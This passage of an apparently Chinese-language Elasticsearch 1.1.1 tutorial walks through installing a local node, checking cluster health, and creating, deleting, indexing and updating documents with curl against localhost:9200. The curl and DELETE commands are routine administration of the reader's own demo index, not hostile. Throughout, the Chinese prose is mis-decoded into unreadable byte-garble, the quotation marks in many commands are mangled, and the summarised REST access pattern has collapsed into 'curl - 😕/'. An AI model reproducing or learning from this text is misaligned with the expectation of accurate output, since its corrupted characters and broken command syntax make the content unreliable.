çš„ç´¢å¼•å°†ä¼šæœ‰5ä¸ªä¸»åˆ†ç‰‡å’Œå¦å¤–5ä¸ªå¤åˆ¶åˆ†ç‰‡ï¼ˆ1ä¸ªå®Œå…¨æ‹·è´ï¼‰ï¼Œè¿™æ ·çš„è¯æ¯ä¸ªç´¢å¼•æ€»å…±å°±æœ‰10ä¸ªåˆ†ç‰‡ã€‚ è¿™äº›é—®é¢˜ææ¸…æ¥šä¹‹åï¼Œæˆ‘ä»¬å°±è¦è¿›å…¥å¥½ç©çš„éƒ¨åˆ†äº†... å®‰è£…Elasticsearchä¾èµ–Java 7ã€‚åœ¨æœ¬æ–‡å†™ä½œçš„æ—¶å€™ï¼Œæ¨èä½¿ç”¨Oracle JDK 1.7.0_55ç‰ˆæœ¬ã€‚Javaçš„å®‰è£…ï¼Œåœ¨å„ä¸ªå¹³å°ä¸Šéƒ½æœ‰å·®å¼‚ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸æƒ³åœ¨è¿™é‡Œæ·±å…¥å¤ªå¤šç»†èŠ‚ã€‚æˆ‘åªæƒ³è¯´ï¼Œåœ¨ä½ å®‰è£…Elasticsearchä¹‹å‰ï¼Œä½  å¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤æ¥æ£€æŸ¥ä½ çš„Javaç‰ˆæœ¬ï¼ˆå¦‚æœæœ‰éœ€è¦ï¼Œå®‰è£…æˆ–è€…å‡çº§ï¼‰ï¼š java -version echo $JAVA_HOME ä¸€æ—¦æˆ‘ä»¬å°†Javaå®‰è£…å®Œæˆï¼Œæˆ‘ä»¬å°±å¯ä»¥ä¸‹è½½å¹¶å®‰è£…Elasticsearchäº†ã€‚å…¶äºŒè¿›åˆ¶æ–‡ä»¶å¯ä»¥ä» www.elasticsearch.org/downloadè¿™é‡Œä¸‹è½½ï¼Œä½ ä¹Ÿå¯ä»¥ä»è¿™é‡Œä¸‹è½½ä»¥å‰å‘å¸ƒçš„ç‰ˆæœ¬ã€‚å¯¹äºæ¯ä¸ªç‰ˆæœ¬ï¼Œä½ å¯ä»¥åœ¨zipã€tarã€ DEBã€RPMç±»å‹çš„åŒ…ä¸­é€‰æ‹©ä¸‹è½½ã€‚ç®€å•èµ·è§ï¼Œæˆ‘ä»¬ä½¿ç”¨taråŒ…ã€‚ æˆ‘ä»¬åƒä¸‹é¢ä¸€æ ·ä¸‹è½½Elasticsearch 1.1.1 taråŒ…ï¼ˆWindowsç”¨æˆ·åº”è¯¥ä¸‹è½½zipåŒ…ï¼‰ï¼š curl -L -O https://download.elasticsearch.org/elasticsearch/elasticsearch/elasticsearch-1.1.1.tar.gz ç„¶åï¼Œå¦‚ä¸‹å°†å…¶è§£å‹ï¼ˆWindowsä¸‹éœ€è¦unzipå“åº”çš„zipåŒ…ï¼‰ï¼š tar -xzvf elasticsearch-1.1.1.tar.gz è¿™å°†åœ¨ä½ çš„å½“å‰ç›®å½•ä¸‹åˆ›å»ºå¾ˆå¤šæ–‡ä»¶å’Œç›®å½•ã€‚ç„¶åï¼Œæˆ‘ä»¬è¿›å…¥åˆ°binç›®å½•ä¸‹ï¼š cd elasticsearch-1.1.1/bin è‡³æ­¤ï¼Œæˆ‘ä»¬å·²ç»å‡†å¤‡å¥½å¼€å¯æˆ‘ä»¬çš„èŠ‚ç‚¹å’Œå•èŠ‚ç‚¹é›†ç¾¤ï¼ˆWindowsç”¨æˆ·åº”è¯¥è¿è¡Œelasticsearch.batæ–‡ä»¶ï¼‰ï¼š ./elasticsearch å¦‚æœä¸€åˆ‡é¡ºåˆ©ï¼Œä½ å°†çœ‹åˆ°å¤§é‡çš„å¦‚ä¸‹ä¿¡æ¯ï¼š ./elasticsearch version, pid, build initializing ... loaded [], sites [] initialized starting ... bound_address {inet}, publish_address {inet} new_master [inet], reason: zen-disco-join (elected_as_master) elasticsearch/rWMtGj3dQouz2r6ZFL9v4g bound_address {inet}, publish_address {inet} recovered indices into cluster_state started ä¸å»æ¶‰åŠå¤ªå¤šç»†èŠ‚ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œä¸€å«åšâ€œNew Goblinâ€ï¼ˆä½ ä¼šè§åˆ°ä¸€ä¸ªä¸åŒçš„æ¼«å¨æ¼«ç”»è§’è‰²ï¼‰çš„èŠ‚ç‚¹å¯åŠ¨å¹¶ä¸”å°†è‡ªå·±é€‰åšå•ç»“ç‚¹é›†ç¾¤çš„masterã€‚ç°åœ¨ä¸ç”¨å…³å¿ƒmasteræ˜¯ä»€ä¹ˆä¸œè¥¿ã€‚è¿™é‡Œé‡è¦çš„å°±æ˜¯ï¼Œæˆ‘ä»¬åœ¨ä¸€ä¸ªé›†ç¾¤ä¸­å¼€å¯äº†ä¸€ä¸ªèŠ‚ç‚¹ã€‚ æ­£å¦‚å…ˆå‰æåˆ°çš„ï¼Œæˆ‘ä»¬å¯ä»¥è¦†ç›–é›†ç¾¤æˆ–è€…èŠ‚ç‚¹çš„åå­—ã€‚æˆ‘ä»¬å¯ä»¥åœ¨å¯åŠ¨Elasticsearchçš„æ—¶å€™é€šè¿‡å‘½ä»¤è¡Œæ¥æŒ‡å®šï¼Œå¦‚ä¸‹ï¼š ./elasticsearch --cluster.name my_cluster_name --node.name my_node_name ä¹Ÿè¦æ³¨æ„ä¸€ä¸‹æœ‰httpæ ‡è®°çš„é‚£ä¸€è¡Œï¼Œå®ƒæä¾›äº†æœ‰å…³HTTPåœ°å€ï¼ˆ192.168.8.112ï¼‰å’Œç«¯å£ï¼ˆ9200ï¼‰çš„ä¿¡æ¯ï¼Œé€šè¿‡è¿™ä¸ªåœ°å€å’Œç«¯å£æˆ‘ä»¬å°±å¯ä»¥ è®¿é—®æˆ‘ä»¬çš„èŠ‚ç‚¹äº†ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒElasticsearchä½¿ç”¨9200æ¥æä¾›å¯¹å…¶REST APIçš„è®¿é—®ã€‚å¦‚æœæœ‰å¿…è¦ï¼Œè¿™ä¸ªç«¯å£æ˜¯å¯ä»¥é…ç½®çš„ã€‚ æ¢ç´¢ä½ çš„é›†ç¾¤restæ¥å£ ç°åœ¨æˆ‘ä»¬å·²ç»æœ‰ä¸€ä¸ªæ­£å¸¸è¿è¡Œçš„èŠ‚ç‚¹ï¼ˆå’Œé›†ç¾¤ï¼‰äº†ï¼Œä¸‹ä¸€æ­¥å°±æ˜¯è¦å»ç†è§£æ€æ ·ä¸å…¶é€šä¿¡äº†ã€‚å¹¸è¿çš„æ˜¯ï¼ŒElasticsearchæä¾›äº†éå¸¸å…¨é¢å’Œå¼ºå¤§çš„ REST APIï¼Œåˆ©ç”¨è¿™ä¸ªREST APIä½ å¯ä»¥åŒä½ çš„é›†ç¾¤äº¤äº’ã€‚ä¸‹é¢æ˜¯åˆ©ç”¨è¿™ä¸ªAPIï¼Œå¯ä»¥åšçš„å‡ ä»¶äº‹æƒ…ï¼š - æ£€æŸ¥ä½ çš„é›†ç¾¤ã€èŠ‚ç‚¹å’Œç´¢å¼•çš„å¥åº·çŠ¶æ€ã€å’Œå„ç§ç»Ÿè®¡ä¿¡æ¯ - ç®¡ç†ä½ çš„é›†ç¾¤ã€èŠ‚ç‚¹ã€ç´¢å¼•æ•°æ®å’Œå…ƒæ•°æ® - å¯¹ä½ çš„ç´¢å¼•è¿›è¡ŒCRUDï¼ˆåˆ›å»ºã€è¯»å–ã€æ›´æ–°å’Œåˆ é™¤ï¼‰å’Œæœç´¢æ“ä½œ - æ‰§è¡Œé«˜çº§çš„æŸ¥è¯¢æ“ä½œï¼Œåƒæ˜¯åˆ†é¡µã€æ’åºã€è¿‡æ»¤ã€è„šæœ¬ç¼–å†™ï¼ˆscriptingï¼‰ã€å°å¹³é¢åˆ»ç”»ï¼ˆfacetingï¼‰ã€èšåˆï¼ˆaggregationsï¼‰å’Œè®¸å¤šå…¶å®ƒæ“ä½œ é›†ç¾¤å¥åº· è®©æˆ‘ä»¬ä»¥åŸºæœ¬çš„å¥åº·æ£€æŸ¥ä½œä¸ºå¼€å§‹ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å®ƒæ¥æŸ¥çœ‹æˆ‘ä»¬é›†ç¾¤çš„çŠ¶æ€ã€‚æ­¤è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨curlï¼Œå½“ç„¶ï¼Œä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ä»»ä½•å¯ä»¥åˆ›å»ºHTTP/REST è°ƒç”¨çš„å·¥å…·ã€‚æˆ‘ä»¬å‡è®¾æˆ‘ä»¬è¿˜åœ¨æˆ‘ä»¬å¯åŠ¨Elasticsearchçš„èŠ‚ç‚¹ä¸Šå¹¶æ‰“å¼€å¦å¤–ä¸€ä¸ªshellçª—å£ã€‚ è¦æ£€æŸ¥é›†ç¾¤å¥åº·ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨_cat APIã€‚éœ€è¦äº‹å…ˆè®°ä½çš„æ˜¯ï¼Œæˆ‘ä»¬çš„èŠ‚ç‚¹HTTPçš„ç«¯å£æ˜¯9200ï¼š curl 'localhost:9200/_cat/health?v' ç›¸åº”çš„å“åº”æ˜¯ï¼š epoch timestamp cluster status node.total node.data shards pri relo init unassign 1394735289 14:28:09 elasticsearch green 1 1 0 0 0 0 0 å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬é›†ç¾¤çš„åå­—æ˜¯â€œelasticsearchâ€ï¼Œæ­£å¸¸è¿è¡Œï¼Œå¹¶ä¸”çŠ¶æ€æ˜¯ç»¿è‰²ã€‚ å½“æˆ‘ä»¬è¯¢é—®é›†ç¾¤çŠ¶æ€çš„æ—¶å€™ï¼Œæˆ‘ä»¬è¦ä¹ˆå¾—åˆ°ç»¿è‰²ã€é»„è‰²æˆ–çº¢è‰²ã€‚ç»¿è‰²ä»£è¡¨ä¸€åˆ‡æ­£å¸¸ï¼ˆé›†ç¾¤åŠŸèƒ½é½å…¨ï¼‰ï¼Œé»„è‰²æ„å‘³ç€æ‰€æœ‰çš„æ•°æ®éƒ½æ˜¯å¯ç”¨çš„ï¼Œä½†æ˜¯æŸäº›å¤åˆ¶æ²¡æœ‰è¢«åˆ†é… ï¼ˆé›†ç¾¤åŠŸèƒ½é½å…¨ï¼‰ï¼Œçº¢è‰²åˆ™ä»£è¡¨å› ä¸ºæŸäº›åŸå› ï¼ŒæŸäº›æ•°æ®ä¸å¯ç”¨ã€‚æ³¨æ„ï¼Œå³ä½¿æ˜¯é›†ç¾¤çŠ¶æ€æ˜¯çº¢è‰²çš„ï¼Œé›†ç¾¤ä»ç„¶æ˜¯éƒ¨åˆ†å¯ç”¨çš„ï¼ˆå®ƒä»ç„¶ä¼šåˆ©ç”¨å¯ç”¨çš„åˆ†ç‰‡æ¥å“åº”æœç´¢è¯· æ±‚ï¼‰ï¼Œä½†æ˜¯å¯èƒ½ä½ éœ€è¦å°½å¿«ä¿®å¤å®ƒï¼Œå› ä¸ºä½ æœ‰ä¸¢å¤±çš„æ•°æ®ã€‚ ä¹Ÿæ˜¯ä»ä¸Šé¢çš„å“åº”ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œä¸€å…±æœ‰ä¸€ä¸ªèŠ‚ç‚¹ï¼Œç”±äºé‡Œé¢æ²¡æœ‰æ•°æ®ï¼Œæˆ‘ä»¬æœ‰0ä¸ªåˆ†ç‰‡ã€‚æ³¨æ„ï¼Œç”±äºæˆ‘ä»¬ä½¿ç”¨é»˜è®¤çš„é›†ç¾¤åå­— ï¼ˆelasticsearchï¼‰ï¼Œå¹¶ä¸”ç”±äºElasticsearché»˜è®¤ä½¿ç”¨ç½‘ç»œå¤šæ’­ï¼ˆmulticastï¼‰å‘ç°å…¶å®ƒèŠ‚ç‚¹ï¼Œå¦‚æœä½ åœ¨ä½ çš„ç½‘ç»œä¸­å¯åŠ¨äº†å¤š ä¸ªèŠ‚ç‚¹ï¼Œä½ å°±å·²ç»æŠŠå¥¹ä»¬åŠ å…¥åˆ°ä¸€ä¸ªé›†ç¾¤ä¸­äº†ã€‚åœ¨è¿™ç§æƒ…å½¢ä¸‹ï¼Œä½ å¯èƒ½åœ¨ä¸Šé¢çš„å“åº”ä¸­çœ‹åˆ°å¤šä¸ªèŠ‚ç‚¹ã€‚ æˆ‘ä»¬ä¹Ÿå¯ä»¥è·å¾—èŠ‚é›†ç¾¤ä¸­çš„èŠ‚ç‚¹åˆ—è¡¨ï¼š curl 'localhost:9200/_cat/nodes?v' å¯¹åº”çš„å“åº”æ˜¯: curl 'localhost:9200/_cat/nodes?v' host ip heap.percent ram.percent load node.role master name mwubuntu1 127.0.1.1 8 4 0.00 d * New Goblin è¿™å„¿ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å«åšâ€œNew Goblinâ€çš„èŠ‚ç‚¹ï¼Œè¿™ä¸ªèŠ‚ç‚¹æ˜¯æˆ‘ä»¬é›†ç¾¤ä¸­çš„å”¯ä¸€èŠ‚ç‚¹ã€‚ åˆ—å‡ºæ‰€æœ‰çš„ç´¢å¼• è®©æˆ‘ä»¬çœ‹ä¸€ä¸‹æˆ‘ä»¬çš„ç´¢å¼•ï¼š curl 'localhost:9200/_cat/indices?v' å“åº”æ˜¯ï¼š curl 'localhost:9200/_cat/indices?v' health index pri rep docs.count docs.deleted store.size pri.store.size è¿™ä¸ªç»“æœæ„å‘³ç€ï¼Œåœ¨æˆ‘ä»¬çš„é›†ç¾¤ä¸­ï¼Œæˆ‘ä»¬æ²¡æœ‰ä»»ä½•ç´¢å¼•ã€‚ åˆ›å»ºä¸€ä¸ªç´¢å¼• ç°åœ¨è®©æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªå«åšâ€œcustomerâ€çš„ç´¢å¼•ï¼Œç„¶åå†åˆ—å‡ºæ‰€æœ‰çš„ç´¢å¼•ï¼š curl -XPUT 'localhost:9200/customer?pretty' curl 'localhost:9200/_cat/indices?v' ç¬¬ä¸€ä¸ªå‘½ä»¤ä½¿ç”¨PUTåˆ›å»ºäº†ä¸€ä¸ªå«åšâ€œcustomerâ€çš„ç´¢å¼•ã€‚æˆ‘ä»¬ç®€å•åœ°å°†prettyé™„åŠ åˆ°è°ƒç”¨çš„å°¾éƒ¨ï¼Œä½¿å…¶ä»¥ç¾è§‚çš„å½¢å¼æ‰“å°å‡ºJSONå“åº”ï¼ˆå¦‚æœæœ‰çš„è¯ï¼‰ã€‚ å“åº”å¦‚ä¸‹ï¼š curl -XPUT 'localhost:9200/customer?pretty' { &quot;acknowledged&quot; : true } curl 'localhost:9200/_cat/indices?v' health index pri rep docs.count docs.deleted store.size pri.store.size yellow customer 5 1 0 0 495b 495b ç¬¬äºŒä¸ªå‘½ä»¤çš„ç»“æœå‘ŠçŸ¥æˆ‘ä»¬ï¼Œæˆ‘ä»¬ç°åœ¨æœ‰ä¸€ä¸ªå«åšcustomerçš„ç´¢å¼•ï¼Œå¹¶ä¸”å®ƒæœ‰5ä¸ªä¸»åˆ†ç‰‡å’Œ1ä»½å¤åˆ¶ï¼ˆéƒ½æ˜¯é»˜è®¤å€¼ï¼‰ï¼Œå…¶ä¸­åŒ…å«0ä¸ªæ–‡æ¡£ã€‚ ä½ å¯èƒ½ä¹Ÿæ³¨æ„åˆ°äº†è¿™ä¸ªcustomerç´¢å¼•æœ‰ä¸€ä¸ªé»„è‰²å¥åº·æ ‡ç­¾ã€‚å›é¡¾æˆ‘ä»¬ä¹‹å‰çš„è®¨è®ºï¼Œé»„è‰²æ„å‘³ç€æŸäº›å¤åˆ¶æ²¡æœ‰ï¼ˆæˆ–è€…è¿˜æœªï¼‰è¢«åˆ†é…ã€‚è¿™ä¸ªç´¢å¼•ä¹‹æ‰€ä»¥è¿™æ ·ï¼Œæ˜¯ å› ä¸ºElasticsearché»˜è®¤ä¸ºè¿™ä¸ªç´¢å¼•åˆ›å»ºä¸€ä»½å¤åˆ¶ã€‚ç”±äºç°åœ¨æˆ‘ä»¬åªæœ‰ä¸€ä¸ªèŠ‚ç‚¹åœ¨è¿è¡Œï¼Œé‚£ä¸€ä»½å¤åˆ¶å°±åˆ†é…ä¸äº†äº†ï¼ˆä¸ºäº†é«˜å¯ç”¨ï¼‰ï¼Œç›´åˆ°å½“å¦å¤–ä¸€ä¸ªèŠ‚ ç‚¹åŠ å…¥åˆ°è¿™ä¸ªé›†ç¾¤åï¼Œæ‰èƒ½åˆ†é…ã€‚ä¸€æ—¦é‚£ä»½å¤åˆ¶åœ¨ç¬¬äºŒä¸ªèŠ‚ç‚¹ä¸Šè¢«å¤åˆ¶ï¼Œè¿™ä¸ªèŠ‚ç‚¹çš„å¥åº·çŠ¶æ€å°±ä¼šå˜æˆç»¿è‰²ã€‚ ç´¢å¼•å¹¶æŸ¥è¯¢ä¸€ä¸ªæ–‡æ¡£ ç°åœ¨è®©æˆ‘ä»¬æ”¾ä¸€äº›ä¸œè¥¿åˆ°customerç´¢å¼•ä¸­ã€‚é¦–å…ˆè¦çŸ¥é“çš„æ˜¯ï¼Œä¸ºäº†ç´¢å¼•ä¸€ä¸ªæ–‡æ¡£ï¼Œæˆ‘ä»¬å¿…é¡»å‘Šè¯‰Elasticsearchè¿™ä¸ªæ–‡æ¡£è¦åˆ°è¿™ä¸ªç´¢å¼•çš„å“ªä¸ªç±»å‹ï¼ˆtypeï¼‰ä¸‹ã€‚ è®©æˆ‘ä»¬å°†ä¸€ä¸ªç®€å•çš„å®¢æˆ·æ–‡æ¡£ç´¢å¼•åˆ°customerç´¢å¼•ã€â€œexternalâ€ç±»å‹ä¸­ï¼Œè¿™ä¸ªæ–‡æ¡£çš„IDæ˜¯1ï¼Œæ“ä½œå¦‚ä¸‹ï¼š curl -XPUT â€˜localhost:9200/customer/external/1?prettyâ€™ -d â€™ { â€œnameâ€: â€œJohn Doeâ€ }â€™ å“åº”å¦‚ä¸‹ï¼š curl -XPUT â€˜localhost:9200/customer/external/1?prettyâ€™ -d â€™ { â€œnameâ€: â€œJohn Doeâ€ }â€™ { â€œ_indexâ€ : â€œcustomerâ€, â€œ_typeâ€ : â€œexternalâ€, â€œ_idâ€ : â€œ1â€, â€œ_versionâ€ : 1, â€œcreatedâ€ : true } ä»ä¸Šé¢çš„å“åº”ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œä¸€ä¸ªæ–°çš„å®¢æˆ·æ–‡æ¡£åœ¨customerç´¢å¼•å’Œexternalç±»å‹ä¸­è¢«æˆåŠŸåˆ›å»ºã€‚æ–‡æ¡£ä¹Ÿæœ‰ä¸€ä¸ªå†…éƒ¨id 1ï¼Œ è¿™ä¸ªidæ˜¯æˆ‘ä»¬åœ¨ç´¢å¼•çš„æ—¶å€™æŒ‡å®šçš„ã€‚ æœ‰ä¸€ä¸ªå…³é”®ç‚¹éœ€è¦æ³¨æ„ï¼ŒElasticsearchåœ¨ä½ æƒ³å°†æ–‡æ¡£ç´¢å¼•åˆ°æŸä¸ªç´¢å¼•çš„æ—¶å€™ï¼Œå¹¶ä¸å¼ºåˆ¶è¦æ±‚è¿™ä¸ªç´¢å¼•è¢«æ˜¾å¼åœ°åˆ›å»ºã€‚åœ¨å‰é¢è¿™ä¸ªä¾‹å­ä¸­ï¼Œå¦‚æœcustomerç´¢å¼•ä¸å­˜åœ¨ï¼ŒElasticsearchå°†ä¼šè‡ªåŠ¨åœ°åˆ›å»ºè¿™ä¸ªç´¢å¼•ã€‚ ç°åœ¨ï¼Œè®©æˆ‘ä»¬æŠŠåˆšåˆšç´¢å¼•çš„æ–‡æ¡£å–å‡ºæ¥ï¼š curl -XGET â€˜localhost:9200/customer/external/1?prettyâ€™ å“åº”å¦‚ä¸‹ï¼š curl -XGET â€˜localhost:9200/customer/external/1?prettyâ€™ { â€œ_indexâ€ : â€œcustomerâ€, â€œ_typeâ€ : â€œexternalâ€, â€œ_idâ€ : â€œ1â€, â€œ_versionâ€ : 1, â€œfoundâ€ : true, â€œ_sourceâ€ : { â€œnameâ€: â€œJohn Doeâ€ } } é™¤äº†ä¸€ä¸ªå«åšfoundçš„å­—æ®µæ¥æŒ‡æ˜æˆ‘ä»¬æ‰¾åˆ°äº†ä¸€ä¸ªIDä¸º1çš„æ–‡æ¡£ï¼Œå’Œå¦å¤–ä¸€ä¸ªå­—æ®µâ€”â€”_sourceâ€”â€”è¿”å›æˆ‘ä»¬å‰ä¸€æ­¥ä¸­ç´¢å¼•çš„å®Œæ•´JSONæ–‡æ¡£ä¹‹å¤–ï¼Œå…¶å®ƒçš„éƒ½æ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«ä¹‹å¤„ã€‚ åˆ é™¤ä¸€ä¸ªæ–‡æ¡£ ç°åœ¨è®©æˆ‘ä»¬åˆ é™¤æˆ‘ä»¬åˆšåˆšåˆ›å»ºçš„ç´¢å¼•ï¼Œå¹¶å†æ¬¡åˆ—å‡ºæ‰€æœ‰çš„ç´¢å¼•ï¼š curl -XDELETE â€˜localhost:9200/customer?prettyâ€™ curl â€˜localhost:9200/_cat/indices?vâ€™ å“åº”å¦‚ä¸‹ï¼š curl -XDELETE â€˜localhost:9200/customer?prettyâ€™ { â€œacknowledgedâ€ : true } curl â€˜localhost:9200/_cat/indices?vâ€™ health index pri rep docs.count docs.deleted store.size pri.store.size è¿™è¡¨æ˜æˆ‘ä»¬æˆåŠŸåœ°åˆ é™¤äº†è¿™ä¸ªç´¢å¼•ï¼Œç°åœ¨æˆ‘ä»¬å›åˆ°äº†é›†ç¾¤ä¸­ç©ºæ— æ‰€æœ‰çš„çŠ¶æ€ã€‚ åœ¨æ›´è¿›ä¸€æ­¥ä¹‹å‰ï¼Œæˆ‘ä»¬å†ç»†çœ‹ä¸€ä¸‹ä¸€äº›æˆ‘ä»¬å­¦è¿‡çš„APIå‘½ä»¤ï¼š curl -XPUT â€˜localhost:9200/customerâ€™ curl -XPUT â€˜localhost:9200/customer/external/1â€™ -d â€™ { â€œnameâ€: â€œJohn Doeâ€ }â€™ curl â€˜localhost:9200/customer/external/1â€™ curl -XDELETE â€˜localhost:9200/customerâ€™ å¦‚æœæˆ‘ä»¬ä»”ç»†ç ”ç©¶ä»¥ä¸Šçš„å‘½ä»¤ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°è®¿é—®Elasticsearchä¸­æ•°æ®çš„ä¸€ä¸ªæ¨¡å¼ã€‚è¿™ä¸ªæ¨¡å¼å¯ä»¥è¢«æ€»ç»“ä¸ºï¼š curl - ğŸ˜•/ è¿™ä¸ªRESTè®¿é—®æ¨¡å¼æ™®éé€‚ç”¨äºæ‰€æœ‰çš„APIå‘½ä»¤ï¼Œå¦‚æœä½ èƒ½è®°ä½å®ƒï¼Œä½ å°±ä¼šä¸ºæŒæ¡Elasticsearchå¼€ä¸€ä¸ªå¥½å¤´ã€‚ä¿®æ”¹ä½ çš„æ•°æ®Elasticsearchæä¾›äº†è¿‘ä¹å®æ—¶çš„æ•°æ®æ“ä½œå’Œæœç´¢åŠŸèƒ½ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œä»ä½ ç´¢å¼•/æ›´æ–°/åˆ é™¤ä½ çš„æ•°æ®åŠ¨ä½œå¼€å§‹åˆ°å®ƒå‡ºç°åœ¨ä½ çš„æœç´¢ç»“æœä¸­ï¼Œå¤§æ¦‚ä¼šæœ‰1ç§’é’Ÿçš„å»¶è¿Ÿã€‚è¿™å’Œå…¶å®ƒç±»ä¼¼SQLçš„å¹³å°ä¸åŒï¼Œæ•°æ®åœ¨ä¸€ä¸ªäº‹åŠ¡å®Œæˆä¹‹åå°±ä¼šç«‹å³å¯ç”¨ã€‚ ç´¢å¼•/æ›¿æ¢æ–‡æ¡£ æˆ‘ä»¬å…ˆå‰çœ‹åˆ°ï¼Œæ€æ ·ç´¢å¼•ä¸€ä¸ªæ–‡æ¡£ã€‚ç°åœ¨æˆ‘ä»¬å†æ¬¡è°ƒç”¨é‚£ä¸ªå‘½ä»¤ï¼š curl -XPUT 'localhost:9200/customer/external/1?pretty' -d ' { &quot;name&quot;: &quot;John Doe&quot; }' å†æ¬¡ï¼Œä»¥ä¸Šçš„å‘½ä»¤å°†ä¼šæŠŠè¿™ä¸ªæ–‡æ¡£ç´¢å¼•åˆ°customerç´¢å¼•ã€externalç±»å‹ä¸­ï¼Œå…¶IDæ˜¯1ã€‚å¦‚æœæˆ‘ä»¬å¯¹ä¸€ä¸ªä¸åŒï¼ˆæˆ–ç›¸åŒï¼‰çš„æ–‡æ¡£åº”ç”¨ä»¥ä¸Šçš„å‘½ä»¤ï¼ŒElasticsearchå°†ä¼šç”¨ä¸€ä¸ªæ–°çš„æ–‡æ¡£æ¥æ›¿æ¢ï¼ˆé‡æ–°ç´¢å¼•ï¼‰å½“å‰IDä¸º1çš„é‚£ä¸ªæ–‡æ¡£ã€‚ curl -XPUT 'localhost:9200/customer/external/1?pretty' -d ' { &quot;name&quot;: &quot;Jane Doe&quot; }' ä»¥ä¸Šçš„å‘½ä»¤å°†IDä¸º1çš„æ–‡æ¡£çš„nameå­—æ®µçš„å€¼ä»â€œJohn Doeâ€æ”¹æˆäº†â€œJane Doeâ€ã€‚å¦‚æœæˆ‘ä»¬ä½¿ç”¨ä¸€ä¸ªä¸åŒçš„IDï¼Œä¸€ä¸ªæ–°çš„æ–‡æ¡£å°†ä¼šè¢«ç´¢å¼•ï¼Œå½“å‰å·²ç»åœ¨ç´¢å¼•ä¸­çš„æ–‡æ¡£ä¸ä¼šå—åˆ°å½±å“ã€‚ curl -XPUT 'localhost:9200/customer/external/2?pretty' -d ' { &quot;name&quot;: &quot;Jane Doe&quot; }' ä»¥ä¸Šçš„å‘½ä»¤ï¼Œå°†ä¼šç´¢å¼•ä¸€ä¸ªIDä¸º2çš„æ–°æ–‡æ¡£ã€‚ åœ¨ç´¢å¼•çš„æ—¶å€™ï¼ŒIDéƒ¨åˆ†æ˜¯å¯é€‰çš„ã€‚å¦‚æœä¸æŒ‡å®šï¼ŒElasticsearchå°†äº§ç”Ÿä¸€ä¸ªéšæœºçš„IDæ¥ç´¢å¼•è¿™ä¸ªæ–‡æ¡£ã€‚Elasticsearchç”Ÿæˆçš„IDä¼šä½œä¸ºç´¢å¼•APIè°ƒç”¨çš„ä¸€éƒ¨åˆ†è¢«è¿”å›ã€‚ ä»¥ä¸‹çš„ä¾‹å­å±•ç¤ºäº†æ€æ ·åœ¨æ²¡æœ‰æŒ‡å®šIDçš„æƒ…å†µä¸‹æ¥ç´¢å¼•ä¸€ä¸ªæ–‡æ¡£ï¼š curl -XPOST 'localhost:9200/customer/external?pretty' -d ' { &quot;name&quot;: &quot;Jane Doe&quot; }' æ³¨æ„ï¼Œåœ¨ä¸Šé¢çš„æƒ…å½¢ä¸­ï¼Œç”±äºæˆ‘ä»¬æ²¡æœ‰æŒ‡å®šä¸€ä¸ªIDï¼Œæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯POSTè€Œä¸æ˜¯PUTã€‚ æ›´æ–°æ–‡æ¡£ é™¤äº†å¯ä»¥ç´¢å¼•ã€æ›¿æ¢æ–‡æ¡£ä¹‹å¤–ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥æ›´æ–°ä¸€ä¸ªæ–‡æ¡£ã€‚ä½†è¦æ³¨æ„ï¼ŒElasticsearchåº•å±‚å¹¶ä¸æ”¯æŒåŸåœ°æ›´æ–°ã€‚åœ¨æˆ‘ä»¬æƒ³è¦åšä¸€æ¬¡æ›´æ–°çš„æ—¶å€™ï¼ŒElasticsearchå…ˆåˆ é™¤æ—§æ–‡æ¡£ï¼Œç„¶ååœ¨ç´¢å¼•ä¸€ä¸ªæ›´æ–°è¿‡çš„æ–°æ–‡æ¡£ã€‚ ä¸‹é¢çš„ä¾‹å­å±•ç¤ºäº†æ€æ ·å°†æˆ‘ä»¬IDä¸º1çš„æ–‡æ¡£çš„nameå­—æ®µæ”¹æˆâ€œJane Doeâ€ï¼š curl -XPOST â€˜localhost:9200/customer/external/1/_update?prettyâ€™ -d â€™ { â€œdocâ€: { â€œnameâ€: â€œJane Doeâ€ } }â€™ ä¸‹é¢çš„ä¾‹å­å±•ç¤ºäº†æ€æ ·å°†æˆ‘ä»¬IDä¸º1çš„æ–‡æ¡£çš„nameå­—æ®µæ”¹æˆâ€œJane Doeâ€çš„åŒæ—¶ï¼Œç»™å®ƒåŠ ä¸Šageå­—æ®µï¼š curl -XPOST â€˜localhost:9200/customer/external/1/_update?prettyâ€™ -d â€™ { â€œdocâ€: { â€œnameâ€: â€œJane Doeâ€, â€œageâ€: 20 } }â€™ æ›´æ–°ä¹Ÿå¯ä»¥é€šè¿‡ä½¿ç”¨ç®€å•çš„è„šæœ¬æ¥è¿›è¡Œã€‚è¿™ä¸ªä¾‹å­ä½¿ç”¨ä¸€ä¸ªè„šæœ¬å°†ageåŠ 5ï¼š curl -XPOST â€˜localhost:9200/customer/external/1/_update?prettyâ€™ -d â€™ { â€œscriptâ€ : â€œctx._source.age += 5â€ }â€™ åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œctx._sourceæŒ‡å‘å½“å‰è¦è¢«æ›´æ–°çš„æ–‡æ¡£ã€‚ 